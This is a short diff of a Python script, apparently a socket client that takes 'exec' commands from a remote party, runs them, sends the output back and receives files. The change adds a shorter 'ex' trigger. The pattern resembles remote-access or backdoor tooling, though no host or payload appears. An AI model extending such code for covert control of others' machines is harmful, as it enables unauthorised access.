@@ -47,7 +47,8 @@ def main():
 					resp = data.split("$")
 					SEPARATOR = "<SEPARATOR>"
 					f = data.split(SEPARATOR)
-					if(resp[0].strip() == "exec"):
+					ps_ex = resp[0].split(" ")
+					if(resp[0].strip() == "exec" or ps_ex[0].strip() == "ex"):
 						recv = resp[1]
 						print(recv)
 
@@ -60,6 +61,7 @@ def main():
 	
 						#send command
 						s.send(res)
+
 					elif f.__len__() >= 2:
 						#receiving file 
 						BUFFER_SIZE = 4096
